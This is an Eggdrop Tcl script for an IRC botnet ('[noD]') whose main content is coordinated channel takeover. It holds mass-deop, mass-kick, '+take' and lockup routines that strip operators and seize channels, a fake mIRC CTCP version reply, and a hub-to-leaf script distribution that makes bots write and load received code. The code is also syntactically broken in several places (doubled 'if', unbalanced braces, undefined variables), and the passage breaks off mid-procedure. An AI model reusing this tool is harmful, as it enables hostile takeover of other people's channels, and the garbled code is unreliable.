#begin
set userfile ".${botnet-nick}.egg"
set notefile ".${botnet-nick}.notes"
set channel-file ".${botnet-nick}.settings"
set pubchan #dia
set p1 $pubchan
if {[regexp {\[} $pubchan]} { regsub -all {\[} $pubchan {\\[} $p1 }
if {[regexp {\]} $pubchan]} { regsub -all {\]} $pubchan {\\]} $p1 }
logfile mk $pubchan .[lindex [split $pubchan #] 1].log
channel add $pubchan
channel set $pubchan chanmode "+stn"
channel set $pubchan need-op "secb op $p1"
channel set $pubchan need-invite "secb i $p1"
channel set $pubchan need-key "secb k $p1"
channel set $pubchan need-unban "secb u $p1"
channel set $pubchan need-limit "secb l $p1" 
channel set $pubchan -clearbans +enforcebans +dynamicbans +userbans
channel set $pubchan +bitch -take -closed
channel set $pubchan +statuslog -stopnethack -revenge +secret +shared
logfile mc * ".${botnet-nick}.log"
set iversion "1.0.1b"
set iversion2 "\[noD\] $iversion"
set servers { 
    irc.core.com:6667 irc.west.gblx.net:6667 irc.freei.net:6667 irc.lagged.org:6667 irc.total.net:6667
    irc.umich.edu:6667 irc.idle.net:6667 irc.east.gblx.net:6667
    irc.mindspring.com:6667 irc.pacbell.net:6667 irc2.exodus.net:6667 irc-e.frontiernet.net:6667irc.stanford.edu:6667
    irc.best.net:6667 irc.exodus.net:6667 irc.sprynet.com:6667 irc.powersurfr.com:6667 irc.rift.com:6667
    irc.mcs.net:6667 irc.colorado.edu:6667 irc.lightning.net:6667 irc.mlink.net:6667 services.us:6667 irc.concentric.net:6667 efnet.cs.hut.fi:6667
    irc.inter.net.il:6667 efnet.telia.no:6667 irc.homelien.no:6667 irc.ced.chalmers.se:6667 efnet.demon.co.uk:6667 irc.magic.ca:6667
}
set console "mocbxs"; set share-users 1
set learn-users 0; set default-port 6667; set network "Efnet"; set never-give-up 1; set server-timeout 8
set servlimit 1; set keep-nick 1; set use-info 0; set strict-host 0; set strict-telnet 0; set hostfile "hosts.allow"; set timezone "EST"
set username "${botnet-nick}"; set realname "${botnet-nick}"; set admin "drain <efnet>"; set log-time 1; set keep-all-logs 0
set switch-logfiles-at 300; set max-notes 50; set text-path "text/"; set temp-path "tmp/"; set motd "motd"
set help-path "help/"; set require-p 0; set open-telnets 0; set connect-timeout 15; set init-server { putserv "MODE $botnick +iw-s" } 
set flood-kick 5:4; set flood-msg 10:9; set flood-chan 0:0; set flood-join 0:0; set flood-ctcp 0:0; set ban-time 120
set ignore-time 15; set save-users-at 00; set notify-users-at 00; set owner "drain"; set whois-fields "url"; set secure-pass 1
set modes-per-line 4; set max-queue-msg 500; set wait-split 300; set wait-info 180; set xfer-timeout 300; set note-life 60
set notify-newusers "$owner"; set files-path "filesys"; set incoming-path "filesys/incoming"; set upload-to-pwd 0; set filedb-path ""
set max-file-users 20; set max-dloads 3; set dcc-block 0; set max-filesize 1024; set copy-to-tmp 1; set small-userfile 1; set kick-avalanche 0
if {![info exists {modes-per-line}]}  { set {modes-per-line} 4 } 
set txt-idlekick "idle %d min"; set txt-kickflag "blah.. get out"; set txt-kickflag2 "blah.. get out"; set txt-kickfriend "Don't Kick Friends"
set txt-kick-fun "MOuhaha"; set txt-masskick "MK: bye"; set txt-massdeop "MD: bye"; set txt-banned "banned"; set txt-banned2 "banned: "
set txt-bogus-username "Bogus Username"; set txt-bogus-chankey "Bogus Channel Key"; set txt-bogus-ban "Bogus Ban"; set txt-abuse-ops "abusing server ops"
set txt-abuse-desync "abusing desync"; set txt-nickflood "nick flood"; set txt-flood "flood"; set txt-lemmingbot "lemmingbot"
set txt-password "Why did you dcc me?"; set txt-negative "Nopes Sorry."; set ctcp-version "mIRC 5.71 K.Mardam-Bey"
set ctcp-finger "woah.. i like that"; set ctcp-userinfo "user?"
proc chk_timerp {i} {
if {[info exists chk_perm($i)]} { unset chk_perm($i) }
}

bind dcc n +tkbot atakeb
proc atakeb {n id a} {
    if {$a == ""} { putdcc $id ".+tkbot \[bot(s)\]"; return }
    if {[llength $a] > 1} { foreach b $a { if if {([validuser $b]) && ([matchattr $b b])} { chattr $b +0 } } }
    if if {([validuser $a]) && ([matchattr $a b])} { chattr $a +0 }
    putallbots "takebot add $a"
    return 1
}

bind dcc n -tkbot dtakeb
proc dtakeb {n id a} {
    if {$a == ""} { putdcc $id ".-tkbot \[bot(s)\]"; return }
    if {[llength $a] > 1} { foreach b $a { if if {([validuser $b]) && ([matchattr $b b0])} { chattr $b -0 } } }    
    if {[llength $a] < 1} { chattr $a -0 }
    putallbots "takebot del $a"
    return 1
}

bind dcc n tkbots stakeb
proc stakeb {n id a} {
    if {$a == ""} { putdcc $id ".tkbots \[bot(s) or *\]"; return" }
    if {$a == "*"} { foreach c [userlist +b] { chattr $c +o0 }; putallbots "takebot set $a"; return }
    foreach b1 [userlist +b] {
        chattr $b1 -0
    }
    if {[llength $a] < 1} { if {([validuser $a]) && ([matchattr $a b])} { chattr $a +0 } }
    if {[llength $a] > 1} {
        foreach b $a {
            if {([validuser $b]) && ([matchattr $b b])} { chattr $b +0 }
        }
    }
    return 1
}

bind bot - takebot takebots
proc takebots {bot cmd arg} {
    set c [lindex $arg 0]
    set a [lrange $arg 1 end]
    switch $c {
        add {
            if {[llength $a] > 1} { foreach b $a { if {([validuser $b]) && ([matchattr $b b0])} { chattr $b +0 } }; return }; chattr $a +0 }
        set { if {$a == "*"} { foreach c [userlist +b] { chattr $c +o0 }; return }
            if {[llength $a] < 1} { if {([validuser $a]) && ([matchattr $a b])} { chattr $a +0 } }
	    if {[llength $a] > 1} { foreach b $a { if {([validuser $b]) && ([matchattr $b b])} { chattr $b +0 } } }
	}
        del {
            if {[llength $a] > 1} { foreach b $a { if if {([validuser $b]) && ([matchattr $b b0])} { chattr $b -0 } } }
	    if {[llength $a] < 1} { chattr $a -0 }
	}
}
proc umatchattr {host f} { 
    if {[set user [finduser *!$host]] != "*"} { if {[matchattr $user $f]} { return 1 } }
    return 0 
}
proc umatchchanattr {host f chan} {
    if {[set user [finduser *!$host]] != "*"} { if {[matchchanattr $user $f $chan]} { return 1 } }
    return 0 
}


bind join - * chkjoin
proc chkjoin {nick uhost hand chan} { global botnick
    set nick [join $nick]
    if {$nick == $botnick} { secb op $chan }
    if {[regexp {i} [getchanmode $chan]]} {
        if {![botisop]} { return }
	if {(![umatchattr $uhost o]) && (![umatchchanattr $uhost o $chan]) && (![umatchchanattr $uhost f $chan])} { dumpserv "KICK $chan $nick :Chan is +i for a reason!"; putlog "\[noD\] $nick joined ${chan}(+i), kicking" }
     }
}

#end
#begin
bind msg - eh *msg:hello
###Queen Mass Deop####
bind dcc n qmdeop queenm
proc queenm {nic id a} { global hub botnick {botnet-nick} {modes-per-line}
    if {${botnet-nick} != $hub} { putdcc $id "Can't Mass deop from a leaf!"; return }
    if {$a == ""} { putdcc $id "qmdeop usage: .qmdeop \[#channel\]"; return }
    if {![botisop $a]} { putdcc $id "Can't Mass Deop use: .mdeop $a"; return } 
    if {![onchan $botnick $a]} { putdcc $id "Can't Mass Deop use: .mdeop $a"; return } 
    set clist [chanlist $a]
    set chan $a
    set deopn 0; set ua 0; set ba 0; set xops ""
    foreach u $clist {
        set u [join $u]
        set uhost [getchanhost $u $chan]
        if {(![umatchattr $uhost o]) && (![umatchchanattr $uhost o $chan]) && ([isop $u $chan]) && ($u != $botnick)} { 
            set xops [linsert $xops [rand 6] "$u"]
        }
    }
    set y 0; set x 0;
    foreach d $xops {
        incr y
        lappend modequeue($x) $d
        if {$y == ${modes-per-line}} {
            set y 0
            incr x
        }
    }
    if {![info exist modequeue(1)]} { putlog "\[noD\] All Ops are Users!"; return }
    set anm [lsort -increasing [array names modequeue]]
    foreach u $anm {
        if {$ba >= [llength [bots]]} { set ba 0 }
        set b [lindex [bots] $ba]
        if {(![isop $b $a]) && ([onchan $b $a])} { putbot $b "secb wops $botnick $a" }
        putlog "$b : qdeop $a $modequeue($u)"
        putbot $b "qdeop $a $modequeue($u)"
        incr ba
    }
    putallbots "qdeop $a !NOW!"
}

bind bot h qdeop qdeop

proc qdeop {bot co arg} { global queedn qui
    set chan [lindex $arg 0]
    if {[lindex $arg 1] == "!NOW!"} { foreach b [lsort -increasing [array names queedn]] { putraw "$queedn($b)"; unset queedn($b); }; putlog "\[noD\] Queen Deop Executed!"; unset qui; return } 
    if {![info exists qui]} { set qui 0 }
    set nicks [lrange $arg 1 end]
    set nickso ""
    if {![info exists queedn($qui)]} { set queedn($qui) "" }
    foreach o $nicks { append nickso "o" }
    if {[expr [string length $queedn($qui)] + [string length "MODE $chan -$nickso :$nicks\n"]] >= 511}  { incr qui }
    append queedn($qui) "MODE $chan -$nickso $nicks\n"
    putlog "$queedn($qui)"
}

bind dcc m mdeop mdeop

proc mdeop {nic id a}  { global botnick {botnet-nick}
    if {$a == ""} { putdcc $id "mdeop usage: .mdeop \[#channel\]"; return } 
    if {![botisop $a]} { putdcc $id "${botnet-nick} Needs ops in $a before they can massdeop, setting +take"; addtchan $a; putallbots "addtakechan $a"; return } 
    if {![onchan $botnick $a]} { putdcc $id "${botnet-nick} not on ${a}, setting +take"; putallbots "addtakechan $a"; addtchan $a; return } 
    set utim 0; set utimer1 0
    foreach b [userlist +b0] {
        if {${botnet-nick} == $b}  { utimer $utim "mdopchan ${botnet-nick} blah $a"; continue } 
        if {[bots] == ""} { continue }
        if {([lsearch -exact "[bots]" $b] != "-1") && ([validuser $b]) && ([matchattr $b o])} {
        incr utimer1
        if {$utimer1 <= 3} { incr utim; set utimer1 0 }
        utimer $utim "putbot $b \"mdop $a\""
        }
    } 
    putlog "\[noD\] takebots are Mass Deoping $a"
    return 1
} 

proc mdopchan {bot com chan} {
    global {modes-per-line} lastmdeop botnick
    if {[array names lastmdeop $chan] != ""} { return }
    if {![botisop $chan]} { return 0 }
    set clist "[chanlist $chan]"
    array names modequeue; set x 1; set y 0; set xops ""
    foreach u $clist {
        set u [join $u]
        set uhost [getchanhost $u $chan]
        if {(![umatchattr $uhost o]) && (![umatchchanattr $uhost o $chan]) && ([isop $u $chan]) && ($u != $botnick)} { 
            set xops [linsert $xops [rand 6] "$u"]
        }
    }
    foreach d $xops {
        incr y
        lappend modequeue($x) $d
        append modeoqueue($x) "o"
        if {$y == ${modes-per-line}} {
            set y 0
            incr x
         }
    }
    if {![info exist modequeue(1)]} { putlog "\[noD\] All Ops are Users!"; return }
    set deopmodes(0) ""
    set anm [lsort -increasing [array names modequeue]]
    set i 0; foreach x $anm {
        if {[expr [string length $deopmodes($i)] + [string length "MODE $chan -$modeoqueue($x) $modequeue($x)\n"]] >= 511}  { incr i }
        append deopmodes($i) "MODE $chan -$modeoqueue($x) $modequeue($x)\n"
    }
    foreach a [array names deopmodes] {
        putraw "$deopmodes($a)"
    }
    set lastmdeop($chan) 10
    utimer 10 "unset lastmdeop($chan)"
}

proc fkickchan {bot com chan} { global kickreason {botnet-nick} lastmkick botnick
    if {[info exists lastmkick($chan)]} { return }
    if {![botisop $chan]} { return 0 }
    set chanlist "[chanlist $chan]"
    set nchanlist ""
    foreach u $chanlist { 
        set u [join $u]
        set uhost [getchanhost $u $chan]
        if {(![umatchattr $uhost o]) && (![umatchchanattr $uhost o $chan]) && ([isop $u $chan]) && ($u != $botnick)} { 
            set nchanlist [linsert $nchanlist [rand 6] "$u"] }
        } 
    set kickusers(0) ""
    set i 0; foreach u $nchanlist {
        if {[expr [string length $kickusers($i)] + [string length "KICK1 $chan $u"] >= 511]}  { incr i } 
        append kickusers($i) "KICK $chan $u\n"
    } 
    foreach a [array names kickusers] {
        putraw "$kickusers($a)\n"
    } 
    set lastmkick($chan) 10
    utimer 10 "unset lastmdeop($chan)"
} 

bind bot o mdop mdopchan
bind bot o fkik fkickchan
bind dcc m fkick mkick

proc fkick {nic id a} { global botnick {botnet-nick}
    if {$a == ""}  { putdcc $id "mkick usage: .mkick \[#channel\]"; return } 
    if {![botisop $a]}  { putdcc $id "${botnet-nick} Needs ops in $a before they can masskick setting +take"; addtakechan $a; putallbots "addtakechan $a";return } 
    if {![onchan $botnick $a]}  { putdcc $id "${botnet-nick} not on $a (joining)"; addtakechan $a; putallbots "addtakechan $a"; return } 
    set utim 0; set utimer1 0
    foreach b [userlist +b0] {
        if {${botnet-nick} == $b}  { utimer $utim "fkickchan $botnick blah $a"; continue } 
        if {[bots] == ""} { continue }
        if {([lsearch -exact "[bots]" $b] != "-1") && ([validuser $b]) && ([matchattr $b o])} {
            incr utimer1
            if {$utimer1 <= 3} { incr utim; set utimer1 0 }
            utimer $utim "putbot $b \"fkik $a\""
        } 
    }
    putlog "\[noD\] takebots are Mass Kicking $a"
    return 1
} 

### Take Channels ### 
bind dcc n +take dcc:addtakechan
proc dcc:addtakechan {nik id a} {
    set a [join $a]
    if {$a == ""}  { putdcc $id ".+take \[#channel\]"; return } 
    if {[botisop $a]}  { opallbt 1; takechan $a; return } 
    putallbots "addtakechan $a"
    addtchan $a
    putlog "\[noD\] Set $a to \2+take\2"
    return 1
} 

bind bot - deltchan delbtchan
proc deltbchan {bot co a} { deltchan $a } 
proc deltchan {a}  {
    channel set $a "-take"
    channel set $a "chanmode +nt-ikl"
} 

bind bot - leave? chkchstat
proc chkchstat {bot co a}  {
    if {[isop [lindex $a 0] [lindex $a 1]]}  { putbot $bot "noleave [lindex $a 1]"; opuser [lindex $a 0] [lindex $a 1]; return } 
}

bind bot - addtakechan addbtakechan
proc addbtakechan {bot co a} { addtakechan $a } 
proc addtchan {chan} {
    addtakechan $chan 
}
bind dcc n -take dcc:deltakechan
proc dcc:deltakechan {nik id a}  { set a [join $a]
    if {$a == ""}  { putdcc $id ".-take \[#channel\]"; return } 
    if {[botisop $a]}  { putdcc $id "Controling $a, no longer \2+take\2" } 
    putallbots "deltchan $a"; deltchan $a
    putlog "\[noD\] set $a to \2-take\2"
    return 1
} 
proc addclosechan {c}  { channel set $c +close } 
proc addopenftake {c}  { channel set $c -close } 
proc opallbt {a} { set a [join $a]
    global {botnet-nick} botnick
    putlog "\[noD\] Oping all bots"
    foreach b [channels] { set b [join $b]
        foreach h [userlist +bo] {
            if {([matchattr $b b]) && ([botisop $b]) && (![isop $h $b]) && ([matchattr $h o]) || ([matchchanattr $h o $b])}  { putallbots "secb wops $botnick $h" } 
        } 
    }
} 

proc takechan {chan} { global {botnet-nick} lockkey
    set chan [join $chan]
    set utim 0; set utimer1 0
    foreach b [userlist +b0] {
        if {$b == ${botnet-nick}} { if {![botisop $chan]} { putallbots "secb op $botnick $chan" }; utimer $utim "mdop $chan\; mkik $chan"; continue } 
        if {[bots] == ""} { continue }
        if {([lsearch -exact "[bots]" $b] != "-1") && ([validuser $b]) && ([matchattr $b o])} {
            incr utimer1
            if {$utimer1 <= 3} { incr utim; set utimer1 0 }
            if {(![isop $b $chan]) && ([botisop $chan])} { opuser [hand2nick $b $chan] $chan }
            utimer $utim "putbot $b \"mdop $chan\""
        } 
        utimer [expr $utim + 5] "putbot [lindex [userlist +b0] [rand [llength [userlist +b0]]]] \"mkik $chan\""
    }
    dumpserv "mode $chan +k $lockkey"
} 

bind dcc o opall opall
proc opall {nik id a}  {
    set a [join $a]
    if {$a == ""} { putdcc $id ".opall \[nick\]"; return } 
    global {botnet-nick}; putlog "\[noD\] Oping [lindex $a 0] on all channels"
    foreach b [channels] {
        set b [join $b]
        if {([matchattr $a o]) && ([botisop $b]) && (![isop $a $b]) || ([matchchanattr $a o $b])}  { opuser $a $b } 
    } 
} 

set lockkey "RX[rand 10][rand 10]"
set lockmodes "itsnm"
bind bot bo closechan mk_closed
bind bot bo openchan mk_opened
bind dcc m lockup lockupchan

proc mk_closed {bot co a} { set a [join $a]
    global lockkey lockmodes
    if {[lindex [getchamode $a] 0] == "$lockmodes"}  { return } 
    lockup $a
} 

proc mk_opened {bot co a}  { set a [join $a]
    global lockkey lockmodes
    if {[regexp i|k|m [lindex [getchanmode $a] 0]]}  { unlock $ch } 
} 

proc lockupchan {nik id c} { global {botnet-nick} botnick; set c [join $c]
    putallbots "lockup $c"
    if {(![onchan $botnick $c]) && (![botisop $c])}  { return } 
    lockup $c
    putlog "\[noD\] Locked Channel $c"
    return 1
}
#end
#begin
bind bot - lockup blockup
proc blockup {b c a} { lockup $a }
proc lockup {c}  { set c [join $c]
    global lockmodes lockkey
    set lockmodesk $lockmodes
    append lockmodesk "k"
    channel set $c chanmode +$lockmodes
    if {[botisop $c]}  {
        if {[lindex [getmodes $c] 0] != $lockmodesk} { dumpserv "mode $ch +$lockmodes $lockkey" }
    } 
} 

bind dcc m unlock unlockchan
proc unlockchan {nik id c}  { global {botnet-nick} botnick; set c [join $c]
    putallbots "unlock $c"
    if {(![onchan $botnick $c]) || (![botisop $c])}  { putdcc $id "I can not unlock $c"; return } 
    unlock $c
    putlog "\[noD\] Unlocked Channel $c"
} 

bind bot - unlock bunlock
proc bunlock {b c a} { set a [join $a]; unlock $a }
proc unlock {c}  { global {botnet-nick} lockmodes botnick; set c [join $c]
    channel set $c chanmode +tnps
    if {(![onchan $botnick $c]) || (![botisop $c])}  { return } 
    if {[lindex [getmodes $c] 0] != "tnps"} { dumpserv "mode $c -[getchamode $c]+nt" }
} 

bind dcc n closeall closeall
proc closeall {nik id a} { 
    global {botnet-nick} botnick
    foreach c [channels] { set c [join $c]
        if {![botisop $c]}  { putlog "\[noD\] Not Opped on ${c}, setting +close"
        addtakechan $c; addclosechan $c; continue } 
        if {![onchan $botnick $c]}  { putlog "\[noD\] Not on ${c}, setting +close"
        addtakechan $c; addclosechan $c; continue } 
        closechans $c
    } 
    putlog "\[noD\] Closed all channels"
    return 1
}

proc closechans {c}  { set c [join $c]
    if {[botisop $c]}  {
        opallbt 1; takechan $c
    } 
}

proc addtchan {a} { set a [join $a]
    addtakechan $a
    channel set $a +close
}

bind dcc m closechan cchan
proc cchan {nik id ch} { set ch [join $ch]
    global {botnet-nick} botnick
    if {![botisop $ch]}  { putlog "Not Opped on ${ch}, setting +close"
        addtakechan $ch; addclosechan $ch; return } 
    if {![onchan $botnick $ch]}  { putdcc $id "Not on ${ch}, setting +close"
        addtakechan $ch; addclosechan $ch; return } 
    closechans $ch
    putlog "\[noD\] Closed channel $ch"
    return 1
}

bind dcc n openall openall
proc openall {nik id a}  { 
    global {botnet-nick} botnick
    foreach c [channels] { set c [join $c]
        if {![botisop $c]}  { putlog "\[noD\] Not Opped on ${c}, setting +take -close"
            addtchan $c; continue } 
        if {![onchan $botnick $c]}  { putlog "\[noD\] Not on ${c}, setting +take -close"
            addtchan $c; continue } 
        openchans $c
    }
    putlog "\[noD\] Opened all channels"
    return 1
} 

bind dcc m openchan ochan
proc ochan {nik id c}  { set c [join $c]
    global {botnet-nick} botnick
    if {![onchan $botnick $c]}  { putlog "\[noD\] Not Opped on ${c}, Adding to Take-Close list!"
        addtchan $c; return } 
    if {![onchan $botnick $c]}  { putlog "\[noD\] Not Opped on ${c}, Adding to Take-Close list!"
        addtchan $c; return }
    openchans $c
    putlog "\[noD\] Opened channel $c"
    return 1
} 

proc openchans {c}  { set c [join $c]
    if {[botisop $c]}  {
        opallbt 1; unlock $c
    } 
} 

unbind dcc - +chan *dcc:+chan
bind dcc n +chan dcc:join
proc dcc:join {nik id a}  { set a [join $a]
    if {$a == ""}  { putdcc $id "+chan \[#channel\]";return 0 } 
    if {[lsearch $a *,*] != "-1"}  { putlog $id "\[noD\] Cannot join channels with commands! $nik"; return 0 } 
    putdcc $id "Channel $a added to the bot."
    netaddchan $a
} 

bind bot b net net
bind dcc n mtjoin netjoin
#bind dcc n mpart netpart
#bind dcc n mmsg netmsg
#bind dcc n mctcp netctcp
bind dcc n mnotice netnot
#bind dcc n mjump netjump
#bind dcc n mhash nethash
#bind dcc n msave netsave
#bind dcc n mhelp nhelp
#bind dcc n mset netchanset
#bind dcc n mmode netmmode
unbind dcc - set *dcc:set
unbind dcc - tcl *dcc:tcl
#bind dcc n fark *dcc:tcl

proc net {b co arg} {
    set c [lindex $arg 0]
    set a [join [lrange $arg 1 end]]
    if {$c == "join"} { 
        if {[info exists djoin($a)]} { putlog "mpart already.. $a"; unset djoin($a); return }
        if {[validchan $a]} { return }
        netaddchan [lindex $a 0]
        putlog "Adding $a to channel list"
    }
    if {$c == "part"}  { if {[validchan $a]} { channel remove $a; dumpserv "part $a"; return }; set djoin($a) yes; return }
    if {$c == "msg"}  { dumpserv "privmsg [lindex $a 0] :[lrange $a 1 [llength $a]]" } 
    if {$c == "ctcp"}  { dumpserv "privmsg [lindex $a 0] :\001[lrange $a 1 [llength $a]]\001" } 
    if {$c == "not"}  { dumpserv "notice [lindex $a 0] :[lrange $a 1 [llength $a]]" } 
    if {$c == "jump"}  { jump $a } 
    if {$c == "hash"}  { rehash } 
    if {$c == "save"}  { save; savechannels } 
    if {$c == "cset"} { channel set [lindex $a 0] [lrange $a 1 end] }
    if {$c == "mode"} { channel set [lindex $a 0] chanmode [lrange $a 1 end] }
} 

proc saveall {}  {save;savechannels;return 1} 
proc netmmode {nik id a} { global {botnet-nick}; set a [join $a]
    if {([llength $a] == "1") || ($a == "")} { putdcc $id ".mmode \[#channel\] \[mode\]"; return }
    putdcc $id "adding [lrange $a 1 end] settings to [lindex $a 0]"; putallbots "net mode $a"; net ${botnet-nick} b "mode $a"; return 1
}

proc netjoin {nik id a}  { global {botnet-nick}; set a [join $a]
    if {([llength $a] != 3) || ($a == "")} { putdcc $id ".mjoin \[bot1,bot2,*\] \[seconds,*\] \[#channel\]"; return }
    if {[regexp {\,} [lindex $a 2]]} { putlog "\[noD\] Cannot join channels with commas in it!"; return } 
    set chan [lindex $a 2]
    if {[regexp {\,} [lindex $a 2]]} { set chan #$chan }
    if {[lindex $a 0] == "*"} { 
        if {[lindex $a 1] == "*"} { putallbots "net join $chan"; net a b "join $chan"; return 1 }
        set timer [lindex $a 1]
        foreach b [bots] { set b [join $b]
            utimer $timer "putbot $b \"net join $chan\""; set timer [expr $timer + [lindex $a 1]] 
        }
        net a b "join $chan"
        return 1
    }
    if {[lindex $a 1] == "*"} { foreach b [split [lindex $a 0] ,] { if {$b == ${botnet-nick}} { net a b "join $chan" }; if {$b != ${botnet-nick}} { putbot $b "net join $chan" } } 
        return 1 }
    set timer [lindex $a 1]
    foreach b [split [lindex $a 0] ,] { set b [join $b]
        if {$b == ${botnet-nick}} { utimer $timer "net a b \"join $chan\"" }
        if {$b != ${botnet-nick}} { utimer $timer "putbot $b \"net join $chan\"" }
        set timer [expr $timer + [lindex $a 1]] 
    } 
    return 1 
}

proc netpart {nik id a}  { global {botnet-nick}; set a [join $a]
    if {$a == ""}  { putdcc $id ".mpart \[#channel\]"; return } 
    if {![validchan $a]} { set djoin($a) "yes" }
    putdcc $id "Removing $a from channels"; putallbots "net part $a"; net a b "part $a"; return 1
}

proc netchanset {nik id a} { global {botnet-nick}; set a [join $a]
    if {([llength $a] == "1") || ($a == "")} { putdcc $id ".mset \[#channel\] \[settings\]"; return }
    putdcc $id "adding [lrange $a 1 end] settings to [lindex $a 0]"; putallbots "net cset $a"; net ${botnet-nick} b "cset $a"; return 1
}

proc netmsg {nik id a}  { global {botnet-nick}; set a [join $a]
    if {([llength $a] == "1") || ($a == "")}  { putdcc $id ".nmsg \[#channel\]|\[nick\] message"; return } 
    putdcc $id "Mass Messaging $a"; putallbots "net msg $a"; net ${botnet-nick} b "msg $a"; return 1
} 

proc netctcp {nik id a}  { global {botnet-nick}; set a [join $a]
    if {([llength $a] == "1") || ($a == "")}  { putdcc $id ".nctcp \[#channel\]|\[nick\] message"; return} 
    putdcc $id "Mass Ctcping $a"; putallbots "net ctcp $a"; net a b "ctcp $a"; return 1
}

proc netnot {nik id a}  { global {botnet-nick}; set a [join $a]
    if {([llength $a] == "1") || ($a == "")}  { putdcc $id ".nnotice \[#channel\]|\[nick\] message"; return } 
    putdcc $id "Mass Noticing $a"; putallbots "net not $a"; net ${botnet-nick} b "not $a"; return 1 
}

proc netjump {nik id a}  { global {botnet-nick}; set a [join $a]
    if {([llength $a] != 2) || ($a == "")}  { putdcc $id ".njump \[bot\] server:port"; return } 
    putdcc $id "Making [lindex $a 0] jump to [lindex $a 1]"
    if {${botnet-nick} == [lindex $a 0]}  { net ${botnet-nick} blah "jump [lindex $a 1]" } 
    if {${botnet-nick} != [lindex $a 0]}  { putbot [lindex $a 0] "net jump [lindex $a 1]" } 
    return 1
} 

proc nethash {nik id a}  { global {botnet-nick}; set a [join $a]
    putdcc $id "nethasing.."; putallbots "net hash"; net ${botnet-nick} a "hash a"; return 1
} 

proc netsave {nik id a}  { set a [join $a]
    putdcc $id "netsaving.."
    putallbots "netsave" 
    saveall
    return 1
} 

proc netaddchan {a}  { global botnick; set a [join $a]
    set a1 $a
    if {[regexp {\[} $a]} { regsub -all {\[} $a {\\[} a1 }
    if {[regexp {\]} $a]} { regsub -all {\]} $a1 {\\]} a1 }
    channel add $a
    channel set $a chanmode "+tn"
    channel set $a need-op "secb op $a1"
    channel set $a need-invite "secb i $a1"
    channel set $a need-key "secb k $a1"
    channel set $a need-unban "secb u $a1"
    channel set $a need-limit "secb l $a1" 
    channel set $a -clearbans +enforcebans +dynamicbans +userbans
    channel set $a +bitch -take -close
    channel set $a +statuslog -stopnethack  -revenge +secret +shared
} 

proc addtakechan {a} { global botnick; set a [join $a]
    set a1 $a
    if {[regexp {\[} $a]} { regsub -all {\[} $a {\\[} a1 }
    if {[regexp {\]} $a]} { regsub -all {\]} $a1 {\\]} a1 }
    channel add $a
    channel set $a chanmode "+tn"
    channel set $a need-op "secb op $a1"
    channel set $a need-invite "secb i $a1"
    channel set $a need-key "secb k $a1"
    channel set $a need-unban "secb u $a1"
    channel set $a need-limit "secb l $a1"
    channel set $a -clearbans +enforcebans +dynamicbans +userbans
    channel set $a +bitch +take +close
    channel set $a +statuslog -stopnethack -revenge +secret +shared
} 

proc secb {a c}  {
    global botname
    set c [join $c]
    if {[bots] == ""} { return }
    if {[regexp {\[} $c]} { regsub -all {\[} $c {\\[} c }
    if {[regexp {\]} $c]} { regsub -all {\]} $c {\\]} c }
    if {$a == "op"} { putallbots "secb on $botnick $c"; return }
    putbot [lindex [bots] [rand [llength [bots]]]] "secb $a $botname $c"
}

bind link - * chk_bot
bind bot bo secb secbots

proc chk_closed {c} { global lockmodes lockkey; set c [join $c]
    if {[lindex [getchanmode $c] 0] != $lockmodes} { 
        dumpserv "mode $c +$lockmodes $lockkey"
        putlog "\[noD\] $c is still closed"
 }
}

proc chk_taked {c} { set c [join $c]
    mdopchan $c
}

proc chk_bot {b v}  { set c [join $b]
    global {botnet-nick} botmode pass iversion
    if {$v == ${botnet-nick}} {
        if {![info exists botmode]} { chk_botmod ${botnet-nick} }
        if {![info exists pass]} { set_pass ${botnet-nick} }
        if {$botmode == "leaf"}  { if {([matchattr $b h]) || ([matchattr $b a])} { return }
           putlog "\[noD\] $b is trying to link with me but i am a leaf!"
           putbot $b "botmode Leaf $iversion"
           unlink $b; return
        }
        putbot $b "botmode Hub $iversion"
        putbot $b "pass $pass"
       }
    if {$b == ${botnet-nick}}  {
        if {$needup == "yes"}  { putbot $v "update Info"; unset needup } 
    }  
} 

proc chk_botmod {a} { global botmode hub {botnet-nick}
    if {![info exists botmode]} { 
        if {${botnet-nick} != $hub} { set botmode "leaf" }
        if {${botnet-nick} == $hub} { set botmode "hub" }
 }
}
proc set_pass {a} { global pass hub {botnet-nick} botmode
    if {![info exists pass]} { 
        if {![info exists botmode]} { chk_botmod ${botnet-nick} }
        if {$botmode == "leaf"} { putbot $hub "pass?" }
        if {$botmode == "hub"} { set pass [randchars [expr 4 + [rand 5]]]; putallbots "pass $pass" }
    }
}

bind bot l pass? sendpass

proc sendpass {b co a} { global pass hub botmode
    if {![info exists pass]} { 
        if {![info exists botmode]} { chk_botmod ${botnet-nick} }
        if {$botmode == "hub"} { set pass [randchars [expr 4 + [rand 5]]]; putallbots "pass $pass" }
        return
    }
    putbot $b "pass $pass"
}

bind bot b botmode chkmode
proc chkmode {b co a}  {
    global iversion
    set mode [lindex $a 0]
    set ver [lindex $a 1]
    if {$mode == "leaf"}  {
        putlog "\[noD\] Connected to wrong bot $b, please reconfigure!"
        if {$ver != $iversion}  { putlog "\[noD\] Incorrect version of Info! will update when connected!"; set needup yes } 
    } 
    if {$mode == "hub"}  {
        putlog "\[noD\] Connected to Hub bot $b"
        if {$ver != $iversion}  { putlog "\[noD\] Incorrect version of Info requesting new version"; putbot $b "update Info" } 
    } 
} 

bind dcc n distro dcc:distro
proc dcc:distro {n i a} { global botnick hub
   if {$hub == $botnick} { putdcc $id "\[noD\] Can only Distro from  hub!"; return }
}

bind bot b update bot:update
proc bot:update {b co a}  { sendscript $b "Info.tcl" } 
proc sendscript {b s}  {
    set script [open $s r]
    if {![info exists $script]}  { return 0 } 
    putbot $b "rc sc $s"
    while {![eof $script]}  {
        putbot $b "rc s [gets $script]"
    } 
    putbot $b "rc d $s"
    close $script
} 

bind bot h rc rcs
proc rcs {bot c b}  { 
    set co [lindex $b 0]
    set a [lrange $b 1 end]
        if {$co == "sc"}  {putlog "\[noD\] Receiving script $a from $bot"} 
        if {$co == "s"}  {
        setscrip [open .tmpscript a]
        puts $setscrip $a
    } 
    if {$co == "d"}  {putlog "\[noD\] Received script $a from $bot!"; exec mv .tmpscript $a; rehash } 
} 

### Get ops ###
proc chk.gque {n c a b} { global botnick botname g.qd
    if {![info exists g.qd(${n}.${c})]} { return }
    unset g.qd(${n}.${c}
    if {$a == "op"} { if {[isop $n $c]} { return }; if {[botisop $c]} { putbot $b "secb wops $botname $c" }; return }
    if {![onchan $n $c]} { if {[botisop $c]} { secbots "$b" "blah" "$a $b $c' } }
}

proc secbots {b c arg} { global botnick botname g.qd; set arg [join $arg]
    set co [lindex $arg 0]
    set bo [lindex $arg 1]
